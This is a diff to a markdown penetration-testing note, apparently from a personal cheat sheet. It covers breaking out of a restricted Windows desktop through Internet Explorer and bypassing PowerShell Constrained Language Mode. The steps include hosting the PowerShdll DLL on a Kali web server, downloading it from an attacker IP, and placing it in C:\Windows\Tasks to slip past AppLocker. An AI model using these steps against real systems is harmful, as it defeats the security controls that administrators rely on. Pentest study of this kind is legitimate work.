@@ -21,9 +21,8 @@ Press view downloads in IE, press the dropdown on the file, open with -> notepad
 Now right click -> "save target as" in IE again. Go to the dropdown "save as type" and select "all files". The ps1-file you have saved will be revealed and you can just press "run with powershell" and a powershell prompt should pop up. This shell should be in Constrained mode. Verify with `$ExecutionContext.SessionState.LanguageMode`, which should say `ConstrainedLanguage`.
 
 #### Bypssing PoSh constrained mode
-Download PowerShdll
-https://github.com/p3nt4/PowerShdll
-Now go to IE again, host powershdll.dll on Kali web server using `python -m SimpleHTTPServer 80`
+Download PowerShdll from https://github.com/p3nt4/PowerShdll
+Host powershdll.dll on Kali web server using `python -m SimpleHTTPServer 80`
 Navigate to the following URL in IE where http://10.7.253.10/PowerShdll.dll
 Save as -> PowerShdll.dll to whatever folder you like. `C:\Windows\Tasks` is generally nice to use when Applocker is installed because it is usually whitelisted. I'm not sure exactly how to check for DLL rules in an Applocked environment yet.
 Now navigate to the desktop in the other powershell prompt
